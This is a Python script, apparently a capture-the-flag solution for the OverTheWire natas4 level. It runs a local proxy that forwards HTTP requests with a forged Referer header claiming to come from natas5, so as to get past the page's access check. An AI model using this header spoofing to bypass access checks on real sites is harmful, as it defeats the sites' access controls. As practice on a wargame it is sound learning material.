import socket
import threading
from concurrent.futures import ThreadPoolExecutor

# Proxy settings
LOCAL_HOST = '127.0.0.1'
LOCAL_PORT = 8001
REMOTE_HOST = 'natas4.natas.labs.overthewire.org'  # Change this to your desired destination
REMOTE_PORT = 80 # Default HTTP Port
REMOTE_IP = ""



def add_referer(payload, referer:str = "None"):
    
    payload["Referer"] = referer


def format_payload(payload):

    separator = "\r\n"

    payload_string = ""
    try:
        payload_string += "GET http://natas4.natas.labs.overthewire.org// " + payload["GET"] + separator
        payload_string += "Host: " + payload["Host"] + separator
        payload_string += "Authorization: " + payload["Authorization"] + separator
        payload_string += "User-Agent: " + payload["User-Agent"] + separator
        payload_string += "Accept: " + payload["Accept"] + separator
        payload_string += "Referer: " + payload["Referer"] + separator
        payload_string += "Connection: " + payload["Connection"] + separator

        payload_string += separator


    except:
        pass  
        
    print("Payload String:\n{}".format(payload_string))

    return payload_string





def handle_client(client_socket):
    # Receive data from the client
    request_data = client_socket.recv(4096)
    if not request_data:
        return

    print("Request Data: {}".format(request_data.decode('utf-8')))

    decoded_string = request_data.decode('utf-8')

    lines = decoded_string.strip().split("\r\n")  # Split the string into lines
    payload = {}

    for line in lines:
        if ':' in line:
            key, value = line.split(':', 1)  # Split at the first occurrence of ':'
            key = key.strip()
            value = value.strip()

            if ("GET" in key):
                key = "GET"
                value = value.split(" ")[1]


            payload[key] = value

    add_referer(payload, referer="http://natas5.natas.labs.overthewire.org/")


    payload_string = format_payload(payload)
    payload_string = payload_string.encode('utf-8')

    try:
        # Create a socket to connect to the remote server
        remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #if (REMOTE_IP == ""):
        REMOTE_IP = socket.gethostbyname(REMOTE_HOST)
        print("Remote Host: {}    Remote IP: {}".format(REMOTE_HOST, REMOTE_IP))
        
        remote_socket.connect((REMOTE_IP, REMOTE_PORT))

    except Exception as error:
        print("Error in remote connection: {}".format(error))

    try:

        # Forward the modified request to the remote server
        remote_socket.send(payload_string)

    except Exception as error:
        print("Error in sending payload: {}".format(error))


    try:
        # Receive data from the remote server
        remote_response = remote_socket.recv(4096)
        print("Remote Response: {}".format(remote_response.decode("utf-8")))

    except Exception as error:
        print("Error in remote response: {}".format(error))

    # Send the response back to the client
    client_socket.send(remote_response)

    # Close the sockets
    remote_socket.close()
    client_socket.close()

def start_proxy():
    # Create a listening socket
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.bind((LOCAL_HOST, LOCAL_PORT))
    proxy_socket.listen(5)
    print(f'[*] Listening on {LOCAL_HOST}:{LOCAL_PORT}')

    # Create a thread pool
    executor = ThreadPoolExecutor(max_workers=10)  # Adjust the number of workers as needed

    while True:
        client_socket, addr = proxy_socket.accept()

        proxy_url = addr[0]
        proxy_port = addr[1]
        print(f'[*] Accepted connection from {proxy_url}:{proxy_port}')

        # Submit the client handling task to the thread pool
        executor.submit(handle_client, client_socket)

if __name__ == '__main__':
    start_proxy()